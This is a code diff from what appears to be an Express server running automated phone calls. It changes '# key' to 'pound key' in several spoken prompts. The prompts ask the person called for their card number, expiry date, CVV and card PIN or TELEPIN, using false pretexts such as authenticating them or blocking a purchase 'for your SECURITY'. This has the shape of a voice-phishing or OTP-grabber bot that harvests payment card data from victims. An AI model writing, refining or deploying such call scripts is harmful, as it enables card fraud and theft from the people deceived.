@@ -261,7 +261,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
               .split('')
               .join(' ')}. Please enter your ${
               cardType !== 'undefined' ? cardType : ''
-            } card expirattion date followed by the # key.`,
+            } card expirattion date followed by the pound key.`,
             language,
             voice: 'female',
             loop: true,
@@ -317,7 +317,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
               .split('')
               .join(' ')}. Please enter your ${
               cardType !== 'undefined' ? cardType : ''
-            } card CVV followed by the # key.`,
+            } card CVV followed by the pound key.`,
             language,
             voice: 'female',
             loop: true,
@@ -368,7 +368,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
               .split('')
               .join(' ')}. To AUTHENTICATE YOU please enter your ${
               language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
-            } followed by the # key.`,
+            } followed by the pound key.`,
             language,
             voice: 'female',
             loop: true,
@@ -467,7 +467,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 .split('')
                 .join(' ')}. To AUTHENTICATE YOU please enter your ${
                 language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
-              } followed by the # key.`,
+              } followed by the pound key.`,
               language,
               voice: 'female',
             },
@@ -520,7 +520,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 .split('')
                 .join(' ')}. To AUTHENTICATE YOU please enter your ${
                 language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
-              } followed by the # key.`,
+              } followed by the pound key.`,
               language,
               voice: 'female',
               loop: true,
@@ -575,7 +575,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                   .split('')
                   .join(' ')}. We need to verify you, please enter your ${
                   cardType !== 'undefined' ? cardType : ''
-                } card number followed by the # key`,
+                } card number followed by the pound key`,
                 language,
                 voice: 'female',
                 loop: true,
@@ -653,7 +653,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                   .split('')
                   .join(
                     ' ',
-                  )}. Please enter your ${cardType} card expiry date followed by the # key.`,
+                  )}. Please enter your ${cardType} card expiry date followed by the pound key.`,
                 language,
                 voice: 'female',
                 loop: true,
@@ -693,7 +693,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the # key`,
+                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
                 language,
                 voice: 'female',
                 loop: true,
